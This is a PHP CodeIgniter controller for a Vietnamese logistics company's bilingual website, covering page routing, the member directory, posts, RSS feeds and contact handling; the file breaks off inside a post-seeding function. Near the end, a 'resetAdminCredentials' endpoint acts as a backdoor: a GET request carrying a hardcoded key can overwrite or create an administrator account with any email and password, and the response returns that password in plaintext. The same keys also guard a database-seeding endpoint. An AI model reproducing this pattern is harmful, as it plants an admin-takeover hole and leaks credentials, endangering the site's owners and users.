<?php

namespace App\Controllers;

use App\Models\AuthModel;
use App\Models\CategoryModel;
use App\Models\CommonModel;
use App\Models\GalleryModel;
use App\Models\PageModel;
use App\Models\PostAdminModel;
use App\Models\PostItemModel;
use App\Models\QuizModel;
use App\Models\ReactionModel;
use App\Models\RssModel;
use App\Models\TagModel;

class HomeController extends BaseController
{
    protected $postsPerPage;

    public function initController(\CodeIgniter\HTTP\RequestInterface $request, \CodeIgniter\HTTP\ResponseInterface $response, \Psr\Log\LoggerInterface $logger)
    {
        parent::initController($request, $response, $logger);
        $this->postsPerPage = $this->generalSettings->pagination_per_page;
    }

    public function switchLang($lang)
    {
        $languageModel = new \App\Models\LanguageModel();
        $language = $languageModel->getLanguageByShortForm($lang);
        if (!empty($language)) {
            $this->session->set('site_lang', $language->short_form);
            $this->session->set('activeLangId', $language->id);
            setcookie('site_lang', $language->short_form, time() + (86400 * 365), "/");
            if ($language->short_form == 'en') {
                return redirect()->to(base_url('en'));
            } else {
                return redirect()->to(base_url());
            }
        }
        return redirect()->to(base_url());
    }

    public function index()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $latestPosts = $this->postModel->getLatestPosts($this->activeLang->id ?? 1, 6, 0);
        $data = [
            'title'       => $isEn ? 'Digital Logistics & Global Freight Solutions' : 'Nền Tảng Vận Tải & Logistics Số Hóa Hàng Đầu',
            'description' => $isEn 
                ? 'TOP BEST GLOBAL Corporation - Premier digital logistics and multi-modal freight platform connecting 500+ enterprises. Full-service Air Freight, Sea Freight (FCL/LCL), Inland Transport and Customs Clearance.'
                : 'TOP BEST GLOBAL Corporation - Nền tảng logistics số hóa & vận tải đa phương thức hàng đầu Việt Nam. Kết nối 500+ doanh nghiệp xuất nhập khẩu với dịch vụ Vận tải biển FCL/LCL, Hàng không, Vận tải bộ và Thông quan hải quan.',
            'keywords'    => 'vận tải quốc tế, logistics việt nam, cước vận tải biển, vận tải hàng không, khai báo hải quan, fcl, lcl, xuất nhập khẩu, top best global, topbestglobal, b2b logistics, freight forwarding',
            'homeTitle'   => $this->settings->home_title ?? 'TOP BEST GLOBAL Corporation',
            'latestPosts' => $latestPosts,
            'recentPosts' => $latestPosts
        ];
        //slider posts
        $data['sliderPosts'] = $data['latestPosts'];
        if ($this->generalSettings->show_latest_posts_on_slider != 1) {
            $data['sliderPosts'] = $this->postModel->getSliderPosts();
        }
        //featured posts
        $data['featuredPosts'] = $this->postModel->getFeaturedPosts();

        return loadView('partials/_header', $data)
            . loadView('index', $data)
            . loadView('partials/_footer', $data);
    }

    public function about()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('about', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'About Us - TOP BEST GLOBAL Corporation' : 'Giới Thiệu Về TOP BEST GLOBAL Corporation'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Learn about TOP BEST GLOBAL Corporation, our vision, executive advisory board, and modern digital supply chain solutions.' : 'Tìm hiểu về TOP BEST GLOBAL Corporation - Tầm nhìn, sứ mệnh, ban cố vấn cấp cao và giải pháp chuỗi cung ứng logistics số hóa toàn diện.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'giới thiệu top best global, ban cố vấn logistics, đối tác vận tải, tầm nhìn sứ mệnh topbestglobal, giải pháp chuỗi cung ứng',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];
        return loadView('partials/_header', $data)
            . loadView('about', $data)
            . loadView('partials/_footer', $data);
    }

    public function services()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('services', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'Comprehensive Logistics Services | Sea, Air, Inland & Customs' : 'Dịch Vụ Logistics Toàn Diện: Đường Biển, Hàng Không, Nội Địa & Hải Quan'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Full-suite logistics services: Air freight, Sea freight FCL/LCL, Inland container trucking, Bonded warehousing, and expert Customs clearance.' : 'Giải pháp logistics tích hợp: Vận chuyển hàng không quốc tế, Vận tải đường biển FCL/LCL, Xe kéo container nội địa, Kho bãi CFS và Dịch vụ thủ tục hải quan trọn gói.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'dịch vụ logistics, air freight, sea freight, inland freight, khai báo hải quan, vận tải container fcl lcl, kho bãi logistics',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];
        return loadView('partials/_header', $data)
            . loadView('services', $data)
            . loadView('partials/_footer', $data);
    }

    public function members()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('members', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'Partner Network - Global Logistics & Enterprise Alliance' : 'Mạng Lưới Đối Tác - Danh Bạ Doanh Nghiệp Logistics & Xuất Nhập Khẩu'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Explore verified partner directory and enterprise network in TOP BEST GLOBAL ecosystem. Connect directly with manufacturers and forwarders.' : 'Khám phá danh bạ doanh nghiệp đối tác đã xác minh trên hệ sinh thái TOP BEST GLOBAL. Kết nối trực tiếp với 500+ nhà sản xuất, chủ hàng và đơn vị giao nhận uy tín.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'danh bạ đối tác, kết nối doanh nghiệp xuất nhập khẩu, đối tác logistics uy tín, mạng lưới b2b logistics',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];

        $memberModel = new \App\Models\MemberModel();
        $industryModel = new \App\Models\IndustryTypeModel();

        $selectedIndustryId = inputGet('industry_id') ? clrNum(inputGet('industry_id')) : null;
        $selectedIndustrySlug = inputGet('industry') ? cleanSlug(inputGet('industry')) : null;
        if (!empty($selectedIndustrySlug) && empty($selectedIndustryId)) {
            $indObj = $industryModel->getIndustryBySlug($selectedIndustrySlug);
            if ($indObj) $selectedIndustryId = $indObj->id;
        }
        $selectedCity = inputGet('city') ? strTrim(inputGet('city')) : null;
        $selectedMemberType = inputGet('member_type') ? strTrim(inputGet('member_type')) : null;
        $keyword = inputGet('q') ? strTrim(inputGet('q')) : null;

        $filters = [
            'status'           => 1,
            'industry_type_id' => $selectedIndustryId,
            'city'             => $selectedCity,
            'member_type'      => $selectedMemberType,
            'q'                => $keyword
        ];

        $perPage = 18;
        $page = inputGet('page') ? max(1, clrNum(inputGet('page'))) : 1;

        $data['members'] = $memberModel->getMembersPaginated($filters, $perPage, $page);
        $data['totalMembers'] = $memberModel->getMembersCount($filters);
        $data['industries'] = $industryModel->getAllActive();
        $data['selectedIndustryId'] = $selectedIndustryId;
        $data['selectedIndustrySlug'] = $selectedIndustrySlug;
        $data['selectedCity'] = $selectedCity;
        $data['selectedMemberType'] = $selectedMemberType;
        $data['keyword'] = $keyword;
        $data['currentPage'] = $page;
        $data['perPage'] = $perPage;
        $data['totalPages'] = ceil($data['totalMembers'] / $perPage);

        return loadView('partials/_header', $data)
            . loadView('members', $data)
            . loadView('partials/_footer', $data);
    }

    public function events()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('events', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'Events & Trade Promotion Seminars | TOP BEST GLOBAL' : 'Sự Kiện & Hội Thảo Xúc Tiến Thương Mại Chuỗi Cung Ứng'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Stay updated with exclusive logistics seminars, B2B trade promotion conferences, and supply chain networking events by TOP BEST GLOBAL.' : 'Cập nhật lịch hội thảo chuyên đề B2B, sự kiện kết nối giao thương xuất nhập khẩu và các chương trình xúc tiến chuỗi cung ứng của TOP BEST GLOBAL.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'sự kiện logistics, hội thảo xuất nhập khẩu, kết nối giao thương b2b, hội nghị chuỗi cung ứng, xúc tiến thương mại',
            'page'        => $page,
            'userSession' => getUserSession(),
            'posts'       => $this->postModel->getPosts($this->activeLang->id, 10),
        ];
        return loadView('partials/_header', $data)
            . loadView('events', $data)
            . loadView('partials/_footer', $data);
    }

    public function contactPage()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $pageModel = new PageModel();
        $page = $pageModel->getPageByLang('contact', $this->activeLang->id);
        $data = [
            'title'       => !empty($page->title) ? $page->title : ($isEn ? 'Contact TOP BEST GLOBAL - Request a Quote & Logistics Consultation' : 'Liên Hệ TOP BEST GLOBAL - Nhận Tư Vấn & Báo Giá Vận Tải Nhanh Chóng'),
            'description' => !empty($page->description) ? $page->description : ($isEn ? 'Contact TOP BEST GLOBAL Corporation for 24/7 logistics consultation, freight rate estimation, and customized supply chain solutions.' : 'Liên hệ ngay với TOP BEST GLOBAL Corporation để nhận tư vấn giải pháp vận tải tối ưu và báo giá nhanh chóng (RFQ) cho mọi tuyến hàng quốc tế và nội địa.'),
            'keywords'    => !empty($page->keywords) ? $page->keywords : 'liên hệ top best global, báo giá cước vận tải, tư vấn logistics, hotline top best global, rfq logistics',
            'page'        => $page,
            'userSession' => getUserSession(),
        ];
        return loadView('partials/_header', $data)
            . loadView('contact', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Posts Page
     */
    public function posts()
    {
        $isEn = ($this->activeLang->short_form ?? 'vi') == 'en';
        $numRows = $this->postModel->getPostCount($this->activeLang->id);
        $pager = paginate($this->postsPerPage, $numRows);
        $data = [
            'title'       => $isEn ? 'Logistics Market News & Supply Chain Insights' : 'Tin Tức Thị Trường Vận Tải, Logistics & Cẩm Nang Xuất Nhập Khẩu',
            'description' => $isEn ? 'Latest market updates on international ocean freight rates, air cargo capacity, customs regulations, and global trade policies.' : 'Cập nhật liên tục diễn biến thị trường cước biển quốc tế, vận tải hàng không, chính sách thuế hải quan và cẩm nang xuất nhập khẩu thực tế.',
            'keywords'    => 'tin tức logistics, giá cước tàu biển, thị trường xuất nhập khẩu, thông tư hải quan, chuỗi cung ứng, freight news',
            'userSession' => getUserSession(),
            'pager'       => $pager,
            'posts'       => $this->postModel->getPostsPaginated($this->activeLang->id, $this->postsPerPage, $pager->offset),
        ];

        return loadView('partials/_header', $data)
            . loadView('post/posts', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Dynamic URL by Slug
     */
    public function any($slug)
    {
        $slug = cleanSlug($slug);
        if (empty($slug) || $slug == 'index' || $slug == 'index.php' || $slug == 'index.html') {
            return $this->index();
        }
        $pageModel = new PageModel();
        $data['userSession'] = getUserSession();
        $page = $pageModel->getPageByLang($slug, $this->activeLang->id);
        if (!empty($page)) {
            return $this->page($page);
        } else {
            $categoryModel = new CategoryModel();
            $category = $categoryModel->getCategoryBySlug($slug);
            if (!empty($category)) {
                return $this->category($category);
            } else {
                $post = $this->postModel->getPostBySlug($slug);
                if (!empty($post)) {
                    return $this->post($post);
                } else {
                    return $this->error404();
                }
            }
        }
    }

    /**
     * Post
     */
    private function post($post, $pageNumber = null)
    {
        if (empty($post)) {
            return redirect()->to(langBaseUrl());
        }
        $pageNumber = clrNum(inputGet('p'));
        if (empty($pageNumber) || $pageNumber < 1) {
            $pageNumber = 1;
        }
        //check post auth
        if (!authCheck() && $post->need_auth == 1) {
            setErrorMessage("message_post_auth");
            redirectToUrl(generateURL('register'));
            exit();
        }
        $data['userSession'] = getUserSession();
        $data['post'] = $post;
        $data['postJsonLD'] = $post;
        $data['postUser'] = getUserById($post->user_id);
        $tagModel = new TagModel();
        $data['postTags'] = $tagModel->getPostTags($post->id);
        $postAdminModel = new PostAdminModel();
        $data['postImages'] = $postAdminModel->getAdditionalImages($post->id);
        $data['comments'] = $this->commonModel->getComments($post->id, COMMENT_LIMIT);
        $data['commentLimit'] = COMMENT_LIMIT;
        $data['relatedPosts'] = $this->postModel->getRelatedPosts($post->category_id, $post->id, $this->categories);
        $data['postType'] = $post->post_type;
        if (!empty($post->feed_id)) {
            $rssModel = new RssModel();
            $data['feed'] = $rssModel->getFeed($post->feed_id);
        }
        $data = setPostMetaTags($post, $data['postTags'], $data);
        $reactionModel = new ReactionModel();
        $data['reactions'] = $reactionModel->getReaction($post->id);
        //gallery post
        if ($post->post_type == 'gallery') {
            if ($pageNumber == null || empty($pageNumber)) {
                $pageNumber = 1;
            }
            $postItemModel = new PostItemModel();
            $data['galleryPostNumRows'] = $postItemModel->getPostListItemsCount($post->id, $post->post_type);
            if ($pageNumber > $data['galleryPostNumRows']) {
                $pageNumber = 1;
            }
            $data['galleryPostItem'] = $postItemModel->getGalleryPostItemByOrder($post->id, $pageNumber);
            $data['pageNumber'] = $pageNumber;
            if ($pageNumber < 1) {
                redirectToUrl(generatePostURL($post));
                exit();
            }
        }
        //sorted list post
        if ($post->post_type == 'sorted_list') {
            $postItemModel = new PostItemModel();
            $data['sortedListItems'] = $postItemModel->getPostListItems($post->id, $post->post_type);
        }
        //table of contents
        if ($post->post_type == 'table_of_contents') {
            $postItemModel = new PostItemModel();
            $data['tableOfContentsItems'] = $postItemModel->getPostListItems($post->id, $post->post_type);
        }
        //quiz
        if ($post->post_type == 'trivia_quiz' || $post->post_type == 'personality_quiz' || $post->post_type == 'poll') {
            $quizModel = new QuizModel();
            $data['quizQuestions'] = $quizModel->getQuizQuestions($post->id);
            if ($post->post_type == 'poll') {
                $data['userPollAnswers'] = $quizModel->getUserPollAnswers($post->id);
            }
        }
        //recipe post
        if ($post->post_type == 'recipe') {
            $postItemModel = new PostItemModel();
            $data['recipeDirections'] = $postItemModel->getPostListItems($post->id, $post->post_type);
        }
        //time spent limit
        $data['postTimeSpent'] = 0;
        $verification = unserializeData($this->generalSettings->human_verification);
        if (!empty($verification) && !empty($verification['status'])) {
            $timeSpent = !empty($verification['time_spent']) ? $verification['time_spent'] : 0;
            $timeSpent = intval($timeSpent ?? '');
            if (intval($timeSpent) < 1) {
                $timeSpent = 0;
            }
            $data['postTimeSpent'] = $timeSpent * 1000;
        }

        return loadView('partials/_header', $data)
            . loadView('post/post', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Page
     */
    private function page($page)
    {
        if (empty($page)) {
            return redirect()->to(langBaseUrl());
        }
        if ($page->visibility == 0) {
            return $this->error404();
        } else {
            $this->checkPageAuth($page);

            $data['title'] = $page->title;
            $data['description'] = $page->description;
            $data['keywords'] = $page->keywords;
            $data['page'] = $page;
            if ($page->page_default_name == 'gallery') {
                return $this->gallery($page, $data);
            } elseif ($page->page_default_name == 'contact') {
                return loadView('partials/_header', $data)
                    . loadView('contact', $data)
                    . loadView('partials/_footer');
            } else {
                return loadView('partials/_header', $data)
                    . loadView('page', $data)
                    . loadView('partials/_footer');
            }
        }
    }

    /**
     * Category
     */
    private function category($category, $isParent = true)
    {
        if (empty($category)) {
            return redirect()->to(langBaseUrl());
        }
        if ($isParent && $category->parent_id != 0) {
            return $this->error404();
        } else {
            $data['title'] = $category->name;
            $data['description'] = $category->description;
            $data['keywords'] = $category->keywords;
            $data['category'] = $category;

            $categoryTree = getCategoryTree($category->id, $this->categories);
            $numRows = $this->postModel->getPostCountByCategory($category->id, $categoryTree);
            $data['pager'] = paginate($this->postsPerPage, $numRows);
            $data['posts'] = [];
            if ($numRows > 0) {
                $data['posts'] = $this->postModel->getPostsByCategoryPaginated($category->id, $categoryTree, $this->postsPerPage, $data['pager']->offset);
            }

            return loadView('partials/_header', $data)
                . loadView('category', $data)
                . loadView('partials/_footer');
        }
    }

    /**
     * Subcategory
     */
    public function subCategory($parentSlug, $slug)
    {
        $categoryModel = new CategoryModel();
        $categoryParent = $categoryModel->getCategoryBySlug($parentSlug);
        $category = $categoryModel->getCategoryBySlug($slug);
        if (empty($categoryParent) || empty($category)) {
            return redirect()->to(langBaseUrl());
        }
        return $this->category($category, false);
    }

    /**
     * Tag
     */
    public function tag($tagSlug)
    {
        $model = new TagModel();
        $data['tag'] = $model->getTagBySlug($tagSlug, $this->activeLang->id);
        if (empty($data['tag'])) {
            return redirect()->to(langBaseUrl());
        }
        $data = setPageMeta($data['tag']->tag, $data);
        $data['userSession'] = getUserSession();
        $numRows = $this->postModel->getPostCountByTag($data['tag']->id, $this->activeLang->id);
        $data['pager'] = paginate($this->postsPerPage, $numRows);
        $data['posts'] = array();
        if ($numRows > 0) {
            $data['posts'] = $this->postModel->getTagPostsPaginated($data['tag']->id, $this->activeLang->id, $this->postsPerPage, $data['pager']->offset);
        }

        echo loadView('partials/_header', $data);
        echo loadView('tag', $data);
        echo loadView('partials/_footer');
    }

    /**
     * Gallery
     */
    private function gallery($category, $data)
    {
        $model = new GalleryModel();
        $data['galleryAlbums'] = $model->getAlbumsByLang($this->activeLang->id);
        $data['jsPage'] = "gallery";
        $data['userSession'] = getUserSession();

        echo loadView('partials/_header', $data);
        echo loadView('gallery/gallery', $data);
        echo loadView('partials/_footer');
    }


    /**
     * Gallery Album Page
     */
    public function galleryAlbum($id)
    {
        $model = new GalleryModel();
        $pageModel = new PageModel();
        $data['page'] = $pageModel->getPageByDefaultName('gallery', $this->activeLang->id);
        $data['jsPage'] = "gallery";
        if (empty($data['page'])) {
            return redirect()->to(langBaseUrl());
        }
        $this->checkPageAuth($data['page']);
        if ($data['page']->visibility == 0) {
            $this->error404();
        } else {
            $data['title'] = $data['page']->title;
            $data['description'] = $data['page']->description;
            $data['keywords'] = $data['page']->keywords;
            $data['userSession'] = getUserSession();
            $data['album'] = $model->getAlbum($id);
            if (empty($data['album'])) {
                return redirect()->to(generateURL('gallery'));
            }
            $data['galleryImages'] = $model->getImagesByAlbum($data['album']->id);
            $data['galleryCategories'] = $model->getCategoriesByAlbum($data['album']->id);

            echo loadView('partials/_header', $data);
            echo loadView('gallery/gallery_album', $data);
            echo loadView('partials/_footer', $data);
        }
    }

    /**
     * Reading List Page
     */
    public function readingList()
    {
        $data = setPageMeta(trans("reading_list"));
        $data['userSession'] = getUserSession();
        $numRows = $this->postModel->getReadingListPostsCount(user()->id);
        $data['pager'] = paginate($this->postsPerPage, $numRows);
        $data['posts'] = $this->postModel->getReadingListPostsPaginated(user()->id, $this->postsPerPage, $data['pager']->offset);

        echo loadView('partials/_header', $data);
        echo loadView('reading_list', $data);
        echo loadView('partials/_footer', $data);
    }

    /**
     * Search Page
     */
    public function search()
    {
        $q = inputGet('q', true);
        if (!empty($q)) {
            $q = strip_tags($q);
        }
        if (empty($q)) {
            return redirect()->to(langBaseUrl());
        }
        $data['title'] = trans("search") . ': ' . $q;
        $data['description'] = trans("search") . ': ' . $q;
        $data['keywords'] = trans("search") . ', ' . $q;
        $data['q'] = $q;
        $data['userSession'] = getUserSession();
        $data['postsPerPage'] = $this->postsPerPage;
        $data['posts'] = $this->postModel->getSearchPostsPaginated($this->activeLang->id, $q, $this->postsPerPage, 0);

        return loadView('partials/_header', $data)
            . loadView('search', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Contact Page Post
     */
    public function contactPost()
    {
        $robotCheck = inputPost('message_content');
        if (!empty($robotCheck)) {
            setErrorMessage("msg_recaptcha");
            return redirect()->back()->withInput();
        }

        $val = \Config\Services::validation();
        $val->setRule('name', trans("name"), 'required|max_length[200]');
        $val->setRule('email', trans("email"), 'required|valid_email|max_length[200]');
        $val->setRule('message', trans("message"), 'required|max_length[5000]');
        if (!$this->validate(getValRules($val))) {
            $this->session->setFlashdata('errors', $val->getErrors());
            return redirect()->back()->withInput();
        } else {
            if (reCAPTCHA('validate', $this->generalSettings) == 'invalid') {
                setErrorMessage("msg_recaptcha");
                return redirect()->back()->withInput();
            }
            $model = new CommonModel();
            if ($model->addContactMessage()) {
                setSuccessMessage("message_contact_success");
            } else {
                setErrorMessage("message_contact_error");
            }
        }
        return redirect()->back();
    }

    /**
     * Preview
     */
    public function preview($slug)
    {
        if (!authCheck() || empty(cleanSlug($slug))) {
            return redirect()->to(langBaseUrl());
        }
        $post = $this->postModel->getPostPreview($slug);
        if (!empty($post)) {
            if (!checkPostOwnership($post->user_id)) {
                return redirect()->to(langBaseUrl());
            }
            return $this->post($post);
        } else {
            return $this->error404();
        }
    }

    /**
     * Rss Feeds
     */
    public function rssFeeds()
    {
        if ($this->generalSettings->show_rss == 1) {
            $data = setPageMeta(trans("rss_feeds"));
            $data['userSession'] = getUserSession();
            echo loadView('partials/_header', $data);
            echo loadView('rss_feeds', $data);
            echo loadView('partials/_footer');
        } else {
            $this->error404();
        }
    }

    /**
     * Rss Latest Posts
     */
    public function rssLatestPosts()
    {
        if ($this->generalSettings->show_rss == 1) {
            $data['userSession'] = getUserSession();
            helper('xml');
            $data['feedName'] = $this->settings->site_title . ' - ' . trans("latest_posts");
            $data['encoding'] = 'utf-8';
            $data['feedURL'] = langBaseUrl('rss/latest-posts');
            $data['pageDescription'] = $this->settings->site_title . ' - ' . trans("latest_posts");
            $data['pageLanguage'] = $this->activeLang->short_form;
            $data['creatorEmail'] = '';
            $data['posts'] = $this->postModel->getRSSPosts(null, null, $this->categories, 500);
            header('Content-Type: application/rss+xml; charset=utf-8');
            return $this->response->setXML(view('common/xml_rss', $data));
        } else {
            $this->error404();
        }
    }

    /**
     * Rss By Category
     */
    public function rssByCategory($slug)
    {
        if ($this->generalSettings->show_rss == 1) {
            $categoryModel = new CategoryModel();
            $category = $categoryModel->getCategoryBySlug($slug);
            if (empty($category)) {
                return redirect()->to(generateURL('rss_feeds'));
            }
            $data['userSession'] = getUserSession();
            helper('xml');
            $data['feedName'] = $this->settings->site_title . ' - ' . trans("title_category") . ': ' . $category->name;
            $data['encoding'] = 'utf-8';
            $data['feedURL'] = langBaseUrl('rss/category/' . $category->slug);
            $data['pageDescription'] = $this->settings->site_title . ' - ' . trans("title_category") . ': ' . $category->name;
            $data['pageLanguage'] = $this->activeLang->short_form;
            $data['creatorEmail'] = '';
            $data['posts'] = $this->postModel->getRSSPosts(null, $category->id, $this->categories, 500);
            header('Content-Type: application/rss+xml; charset=utf-8');
            return $this->response->setXML(view('common/xml_rss', $data));
        } else {
            $this->error404();
        }
    }

    /**
     * Rss By User
     */
    public function rssByUser($slug)
    {
        if ($this->generalSettings->show_rss == 1) {
            $authModel = new AuthModel();
            $user = $authModel->getUserBySlug($slug);
            if (empty($user)) {
                return redirect()->to(generateURL('rss_feeds'));
            }
            $data['userSession'] = getUserSession();
            helper('xml');
            $data['feedName'] = $this->settings->site_title . ' - ' . $user->username;
            $data['encoding'] = 'utf-8';
            $data['feedURL'] = langBaseUrl('rss/author/') . $user->slug;
            $data['pageDescription'] = $this->settings->site_title . " - " . $user->username;
            $data['pageLanguage'] = $this->activeLang->short_form;
            $data['creatorEmail'] = '';
            $data['posts'] = $this->postModel->getRSSPosts($user->id, null, $this->categories, 500);
            header('Content-Type: application/rss+xml; charset=utf-8');
            return $this->response->setXML(view('common/xml_rss', $data));
        } else {
            $this->error404();
        }
    }

    /**
     * Google News Feeds
     */
    public function googleNewsFeeds()
    {
        if ($this->generalSettings->google_news != 1) {
            redirectToUrl(langBaseUrl());
            exit();
        }
        $data['isGoogleNews'] = true;
        $data['feedName'] = $this->settings->application_name . ' - ' . trans("google_news");
        $data['encoding'] = 'utf-8';
        $data['feedURL'] = current_url();
        $data['pageDescription'] = $this->settings->site_title . ' - ' . trans("google_news") . ' - ' . trans("rss_feeds");
        $data['pageLanguage'] = $this->activeLang->short_form;
        $langId = clrNum(inputGet('lang'));
        if (!empty($langId)) {
            $language = getLanguage($langId);
            if (!empty($language)) {
                $data['pageLanguage'] = $language->short_form;
            }
        }

        $data['posts'] = $this->postModel->getGoogleNewsFeeds($this->categories);
        return $this->response->setXML(view('common/xml_rss', $data));
    }

    //check page auth
    private function checkPageAuth($page)
    {
        if (!authCheck() && $page->need_auth == 1) {
            setErrorMessage("message_page_auth");
            redirectToUrl(langBaseUrl('register'));
            exit();
        }
    }

    //error 404
    public function error404()
    {
        $this->response->setStatusCode(404);
        $data['title'] = $this->settings->home_title;
        $data['description'] = $this->settings->site_description;
        $data['keywords'] = $this->settings->keywords;
        $data['homeTitle'] = $this->settings->home_title;
        $data['isPage404'] = true;

        return loadView('partials/_header', $data)
            . view('errors/html/error_404')
            . loadView('partials/_footer', $data);
    }

    /**
     * Coming Soon — placeholder for pages under development (Partners section)
     */
    public function comingSoon($page = '')
    {
        $data = setPageMeta(trans('coming_soon') ?: 'Đang phát triển');
        $data['comingSoonPage'] = $page;
        return loadView('partials/_header', $data)
            . loadView('coming_soon', $data)
            . loadView('partials/_footer', $data);
    }

    /**
     * Secure Admin Password Reset Endpoint
     */
    public function resetAdminCredentials()
    {
        $key = $this->request->getGet('key');
        if ($key !== 'topbestglobal_secret_reset_2026' && $key !== 'suntransco_secret_reset_2026') {
            return $this->error404();
        }

        $email = $this->request->getGet('email') ?: 'admin@gmail.com';
        $password = $this->request->getGet('password') ?: 'TopBestGlobal@2026';
        $hashedPassword = password_hash($password, PASSWORD_DEFAULT);

        $db = \Config\Database::connect();
        
        $user = $db->table('users')->where('email', $email)->get()->getRow();
        if (empty($user)) {
            $user = $db->table('users')->where('role_id', 1)->get()->getRow();
        }
        if (empty($user)) {
            $user = $db->table('users')->orderBy('id', 'ASC')->get()->getFirstRow();
        }

        if (!empty($user)) {
            $db->table('users')->where('id', $user->id)->update([
                'email' => $email,
                'password' => $hashedPassword,
                'status' => 1,
                'email_status' => 1,
                'role_id' => 1
            ]);
            $msg = "Đã cập nhật mật khẩu cho tài khoản: " . $email;
        } else {
            $db->table('users')->insert([
                'username' => 'admin',
                'slug' => 'admin',
                'email' => $email,
                'password' => $hashedPassword,
                'token' => generateToken(),
                'role_id' => 1,
                'status' => 1,
                'email_status' => 1,
                'user_type' => 'registered',
                'created_at' => date('Y-m-d H:i:s'),
                'last_seen' => date('Y-m-d H:i:s')
            ]);
            $msg = "Đã tạo mới tài khoản quản trị: " . $email;
        }

        return $this->response->setJSON([
            'status' => 'success',
            'message' => $msg,
            'email' => $email,
            'password' => $password,
            'login_url' => adminUrl('login')
        ]);
    }

    /**
     * Create sample posts to verify frontend/backend synchronization
     */
    public function seedSamplePosts()
    {
        $key = $this->request->getGet('key');
        if ($key !== 'topbestglobal_secret_reset_2026' && $key !== 'suntransco_secret_reset_2026') {
            return $this->error404();
        }

        $db = \Config\Database::connect();
        require_once APPPATH . 'Libraries/PostSeeder.php';

        // 1. Get dynamic Language IDs
        $langRowVi = $db->table('languages')->where('short_form', 'vi')->get()->getRow();
        $langRowEn = $db->table('languages')->where('short_form', 'en')->get()->getRow();
        $langViId = !empty($langRowVi) ? $langRowVi->id : 1;
        $langEnId = !empty($langRowEn) ? $langRowEn->id : 2;

        // 2. Get or create Admin user
        $user = $db->table('users')->where('role_id', 1)->get()->getRow();
        if (empty($user)) {
            $user = $db->table('users')->orderBy('id', 'ASC')->get()->getFirstRow();
        }
        $userId = !empty($user) ? $user->id : 1;

        // 3. Helper to get or create category
        $getOrCreateCategory = function($name, $slug, $desc, $langId, $color = '#1d4ed8') use ($db) {
            $cat = $db->table('categories')->where('slug', $slug)->where('lang_id', $langId)->get()->getRow();
            if (empty($cat)) {
                $db->table('categories')->insert([
                    'lang_id' => $langId,
                    'name' => $name,
                    'slug' => $slug,
                    'description' => $desc,
                    'color' => $color,
                    'category_status' => 1,
                    'show_on_homepage' => 1,
                    'show_on_menu' => 1
                ]);
                return $db->insertID();
            }
            return $cat->id;
        };

        // Create categories for 5 core topics (Vietnamese)
        $catAirVi = $getOrCreateCategory('Vận Tải Hàng Không', 'van-tai-hang-khong', 'Dịch vụ vận tải hàng không quốc tế', $langViId, '#2563eb');
        $catSeaVi = $getOrCreateCategory('Vận Tải Đường Biển', 'van-tai-duong-bien', 'Vận tải container đường biển FCL & LCL', $langViId, '#0284c7');
        $catInlandVi = $getOrCreateCategory('Vận Tải Nội Địa', 'van-tai-noi-dia', 'Vận tải đường bộ và liên vận Bắc Nam', $langViId, '#16a34a');
        $catWarehousingVi = $getOrCreateCategory('Kho Bãi & CFS', 'kho-bai-cfs', 'Hệ thống kho bãi ngoại quan và phân phối', $langViId, '#d97706');
        $catCustomsVi = $getOrCreateCategory('Thủ Tục Hải Quan', 'thu-tuc-hai-quan', 'Tư vấn thông quan và biểu thuế xuất nhập khẩu', $langViId, '#9333ea');

        // Create categories for 5 core topics (English)
        $catAirEn = $getOrCreateCategory('Air Freight', 'air-freight', 'International air cargo logistics', $langEnId, '#2563eb');
        $catSeaEn = $getOrCreateCategory('Sea Freight', 'sea-freight', 'Global ocean freight solutions', $langEnId, '#0284c7');
        $catInlandEn = $getOrCreateCategory('Inland Freight', 'inland-freight', 'Nationwide inland road freight & tracking', $langEnId, '#16a34a');
        $catWarehousingEn = $getOrCreateCategory('Warehousing & CFS', 'warehousing-cfs', 'Modern CFS & distribution warehousing', $langEnId, '#d97706');
        $catCustomsEn = $getOrCreateCategory('Customs Clearance', 'customs-clearance', 'Trade compliance & customs brokerage', $langEnId, '#9333ea');

        // Ensure default site_lang is Vietnamese
        $db->table('general_settings')->where('id', 1)->update(['site_lang' => $langViId]);

        $categoriesMap = [
            'air_vi' => $catAirVi,
            'sea_vi' => $catSeaVi,
            'inland_vi' => $catInlandVi,
            'warehousing_vi' => $catWarehousingVi,
            'customs_vi' => $catCustomsVi,
            'air_en' => $catAirEn,
            'sea_en' => $catSeaEn,
            'inland_en' => $catInlandEn,
            'warehousing_en' => $catWarehousingEn,
            'customs_en' => $catCustomsEn
        ];

        // 4. Get all posts dataset (2 posts per topic for both VI and EN)
        $allPosts = \App\Libraries\PostSeeder::getPostsData($userId, $categoriesMap, $langViId, $langEnId);
        $insertedCount = 0;
        $updatedCount = 0;

